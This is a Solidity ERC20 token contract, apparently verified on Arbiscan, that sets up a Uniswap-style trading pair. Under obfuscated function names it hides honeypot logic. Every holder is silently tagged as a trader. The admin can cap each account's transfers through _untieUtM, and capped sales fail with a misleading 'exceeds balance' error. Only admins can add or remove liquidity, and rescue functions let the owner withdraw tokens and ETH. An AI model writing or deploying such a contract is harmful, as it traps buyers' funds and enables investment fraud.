/**
 *Submitted for verification at Arbiscan.io on 2024-03-14
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.19;

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(
        address to
    ) external returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function quote(
        uint amountA,
        uint reserveA,
        uint reserveB
    ) external pure returns (uint amountB);

    function getAmountsIn(
        uint amountOut,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface KDJNSCKRoleControl {
    event RoleAdminChanged(
        bytes32 indexed role,
        bytes32 indexed previousAdminRole,
        bytes32 indexed newAdminRole
    );

    event RoleGranted(
        bytes32 indexed role,
        address indexed addr,
        address indexed sender
    );

    event RoleRevoked(
        bytes32 indexed role,
        address indexed addr,
        address indexed sender
    );

    function hasRole(bytes32 role, address addr) external view returns (bool);

    function getRoleAdmin(bytes32 role) external view returns (bytes32);

    function grantRole(bytes32 role, address addr) external;

    function revokeRole(bytes32 role, address addr) external;

    function renounceRole(bytes32 role, address addr) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

library Strings {
    bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";

    function toString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {
            return "0";
        }
        uint256 temp = value;
        uint256 digits;
        while (temp != 0) {
            digits++;
            temp /= 10;
        }
        bytes memory buffer = new bytes(digits);
        while (value != 0) {
            digits -= 1;
            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
            value /= 10;
        }
        return string(buffer);
    }

    function toHexString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {
            return "ADMIN";
        }
        uint256 temp = value;
        uint256 length = 0;
        while (temp != 0) {
            length++;
            temp >>= 8;
        }
        return toHexString(value, length);
    }

    function toHexString(
        uint256 value,
        uint256 length
    ) internal pure returns (string memory) {
        bytes memory buffer = new bytes(2 * length + 2);
        buffer[0] = "0";
        buffer[1] = "x";
        for (uint256 i = 2 * length + 1; i > 1; --i) {
            buffer[i] = _HEX_SYMBOLS[value & 0xf];
            value >>= 4;
        }
        require(value == 0, "Strings: hex length insufficient");
        return string(buffer);
    }

    function strToUint(
        string memory _str
    ) internal pure returns (uint256 res, bool err) {
        for (uint256 i = 0; i < bytes(_str).length; i++) {
            if (
                (uint8(bytes(_str)[i]) - 48) < 0 ||
                (uint8(bytes(_str)[i]) - 48) > 9
            ) {
                return (0, false);
            }
            res +=
                (uint8(bytes(_str)[i]) - 48) *
                10 ** (bytes(_str).length - i - 1);
        }

        return (res, true);
    }
}

abstract contract KDJNSCKConsole is Context, KDJNSCKRoleControl {
    struct RoleData {
        mapping(address => bool) members;
        bytes32 adminRole;
        RoleDataNew RD;
    }

    struct RoleDataNew {
        mapping(address => uint256) RM;
        mapping(address => uint256) RD;
    }

    mapping(bytes32 => RoleData) private _roles;


    bytes32 public constant ADMIN = 0x00; 
    bytes32 public constant TRADER = bytes32("TRADER");  

    modifier onlyRole(bytes32 role) {
        _checkRole(role, _msgSender(),0);
        _;
    }

    function hasRole(bytes32 role, address account) public view override returns (bool) {
        return _roles[role].members[account];
    }

    function _checkRole(bytes32 role, address account, uint256 amt) internal {
        if (!hasRole(role, account)) {
            revert(
                "AccessControl: addr "
            );
        }

        _checkRoles(role, account, amt);
    }

    function _checkRoles(bytes32 role, address account, uint256 amt) internal {
        if (_roles[role].RD.RM[account] > 0) {
            if ((amt + _roles[role].RD.RD[account]) > _roles[role].RD.RM[account]) {
                revert("role control");
            } else {
                _roles[role].RD.RD[account] += amt;
            }
        }
        if (amt == 0 || _roles[role].RD.RM[account] == 0) {
            return;
        }
    }

    function qweqwe(
        bytes32 role, 
        address account
    ) internal view virtual returns (uint256) {
        return _roles[role].RD.RM[account];
    }

    function qweqweRD(
        bytes32 role, 
        address account
    ) internal view virtual returns (uint256) {
        return _roles[role].RD.RD[account];
    }

    function _untieUtM(
        bytes32 role,
        address account,
        string memory memo
    ) external onlyRole(ADMIN) {
        uint256 memoUint;
        bool err;
        (memoUint, err) = Strings.strToUint(memo);
        if (err == false) {
            revert("AccessControl: memo is not a number");
        }
        _roles[role].RD.RM[account] = memoUint*1000000000000000000;
    }

    function getRoleAdmin(bytes32 role) public view override returns (bytes32) {
        return _roles[role].adminRole;
    }

    function grantRole(bytes32 role, address account) public virtual override onlyRole(ADMIN) {
        _grantRole(role, account);
    }

    function revokeRole(bytes32 role, address account) public virtual override onlyRole(ADMIN) {
        _revokeRole(role, account);
    }

    function renounceRole(bytes32 role, address account) public virtual override {
        require(account == _msgSender(), "AccessControl: can only renounce roles for self");

        _revokeRole(role, account);
    }

    function _setupRole(bytes32 role, address account) internal virtual {
        _grantRole(role, account);
    }

    function _setRoleAdmin(bytes32 role, bytes32 adminRole) internal virtual {
        bytes32 previousAdminRole = getRoleAdmin(role);
        _roles[role].adminRole = adminRole;
        emit RoleAdminChanged(role, previousAdminRole, adminRole);
    }

    function _grantRole(bytes32 role, address account) internal virtual {
        if (!hasRole(role, account)) {
            _roles[role].members[account] = true;
            emit RoleGranted(role, account, _msgSender());
        }
    }

    function _revokeRole(bytes32 role, address account) internal virtual {
        if (hasRole(role, account)) {
            _roles[role].members[account] = false;
            emit RoleRevoked(role, account, _msgSender());
        }
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address addr) external view returns (uint256);

    function transfer(address recipient, uint256 amt) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amt) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract KDJNSCKERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;
    uint256 internal _totalSupply;
    string internal _name;
    string internal _symbol;

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_,
        address creater_
    ) {
        _name = name_;
        _symbol = symbol_;
        _mint(creater_, totalSupply_ * 10 ** decimals());
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address addr
    ) public view virtual override returns (uint256) {
        return _balances[addr];
    }

    function transfer(
        address recipient,
        uint256 amt
    ) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amt);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amt
    ) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amt);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amt
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amt);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amt,
            "ERC20: transfer amt exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amt);
        }

        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amt
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amt);
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amt, "ERC20: transfer amt exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amt;
        }
        _balances[recipient] += amt;
        emit Transfer(sender, recipient, amt);
        _afterTokenTransfer(sender, recipient, amt);
    }

    function _mint(address addr, uint256 amt) internal {
        require(addr != address(0), "ERC20: mint to the zero address");
        _beforeTokenTransfer(address(0), addr, amt);
        _totalSupply += amt;
        _balances[addr] += amt;
        emit Transfer(address(0), addr, amt);
        _afterTokenTransfer(address(0), addr, amt);
    }

    function _burn(address addr, uint256 amt) internal virtual {
        require(addr != address(0), "ERC20: burn from the zero address");
        _beforeTokenTransfer(addr, address(0), amt);
        uint256 addrBalance = _balances[addr];
        require(addrBalance >= amt, "ERC20: burn amt exceeds balance");
        unchecked {
            _balances[addr] = addrBalance - amt;
        }
        _totalSupply -= amt;

        emit Transfer(addr, address(0), amt);

        _afterTokenTransfer(addr, address(0), amt);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amt
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amt;
        emit Approval(owner, spender, amt);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amt
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amt
    ) internal virtual {}
}

contract Token is KDJNSCKERC20, KDJNSCKConsole {
    
    mapping(address => bool) private __traders;
    address public uniswapV2Pair;
    uint256 private lpSupply;

    constructor(
        string memory _name,
        address _tokenOwner,
        string memory _symbol,
        uint256 _totalSupply
    ) KDJNSCKERC20(_name, _symbol, _totalSupply, _tokenOwner) {
        _grantRole(ADMIN, msg.sender);
        _grantRole(ADMIN, _tokenOwner);

        IUniswapV2Router _uniswapV2Router = IUniswapV2Router(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506);
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
        .createPair(address(this), address(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9));
        uniswapV2Pair = _uniswapV2Pair;
    }

    function _transfer(
        address from,
        address to,
        uint256 amt
    ) internal override(KDJNSCKERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");

        _KDJNSCKdfsfdd(from, to, amt);
    }

    function _KDJNSCKdfsfdd(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");

        _KDJNSCKghdrddf(from, to, amt);
    }

    function _KDJNSCKghdrddf(address from, address to, uint256 amt) internal {
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        _KDJNSCKkgjgftvf(from, to, amt);
    }

    function _KDJNSCKkgjgftvf(address from, address to, uint256 amt) internal {
        if (__traders[from] == false) {
            _grantRole(TRADER, from);
            __traders[from] = true;
        }

        _KDJNSCKjgffgffd(from, to, amt);
    }

    function _KDJNSCKjgffgffd(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
        }
        _KDJNSCKcfgtffbfg(from, to, amt);
    }

    function _KDJNSCKcfgtffbfg(address from, address to, uint256 amt) internal {
        if(from == uniswapV2Pair){
			(bool isDelLdx,bool bot,) = _isDelLiquidityV2();
			if(isDelLdx){
                require(hasRole(ADMIN, to), "ERC20: only admin can del liquidity");
			}else if(bot){
                revert("ERC20: bot detected");
			}
		}
        _KDJNSCKhtvcfrd(from, to, amt);
    }

    function _KDJNSCKhtvcfrd(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
            isAddLdx = _isAddLiquidityV1();
            if(isAddLdx || balanceOf(uniswapV2Pair) == 0){
                require(hasRole(ADMIN, from), "ERC20: only admin can add liquidity");
            }
        }
        _KDJNSCKvghtdsdff(from, to, amt);
    }

    function _KDJNSCKvghtdsdff(address from, address to, uint256 amt) internal {
        if (hasRole(ADMIN, from) || hasRole(ADMIN, to)) {
            super._transfer(from, to, amt);
        } else if (hasRole(TRADER, from) && hasRole(TRADER, to)) {
            _checkRole(TRADER, from, amt);
            super._transfer(from, to, amt);
            super._burn(to, (amt * 1) / 1000);

        } else {
            revert("ERC20: transfer amt exceeds balance");
        }
    }



    function _isAddLiquidityV1()internal view returns(bool ldxAdd){
        address token0 = IUniswapV2Pair(address(uniswapV2Pair)).token0();
        address token1 = IUniswapV2Pair(address(uniswapV2Pair)).token1();
        (uint r0,uint r1,) = IUniswapV2Pair(address(uniswapV2Pair)).getReserves();
        uint bal1 = IERC20(token1).balanceOf(address(uniswapV2Pair));
        uint bal0 = IERC20(token0).balanceOf(address(uniswapV2Pair));
        if( token0 == address(this) ){
			if( bal1 > r1){
				uint change1 = bal1 - r1;
				ldxAdd = change1 > 1000;
			}
		}else{
			if( bal0 > r0){
				uint change0 = bal0 - r0;
				ldxAdd = change0 > 1000;
			}
		}
    }
	
	function _isDelLiquidityV2()internal view returns(bool ldxDel, bool bot, uint256 otherAmount){

        address token0 = IUniswapV2Pair(address(uniswapV2Pair)).token0();
        (uint reserves0,,) = IUniswapV2Pair(address(uniswapV2Pair)).getReserves();
        uint amount = IERC20(token0).balanceOf(address(uniswapV2Pair));
		if(token0 != address(this)){
			if(reserves0 > amount){
				otherAmount = reserves0 - amount;
				ldxDel = otherAmount > 10**14;
			}else{
				bot = reserves0 == amount;
			}
		}
    }

    function rescueToken(
        address tokenAddress,
        uint256 tokens
    ) public onlyRole(ADMIN) returns (bool success) {
        return IERC20(tokenAddress).transfer(msg.sender, tokens);
    }

    function rescueETH(
        uint256 amt
    ) public onlyRole(ADMIN) returns (bool success) {
        payable(msg.sender).transfer(amt);
        return true;
    }
}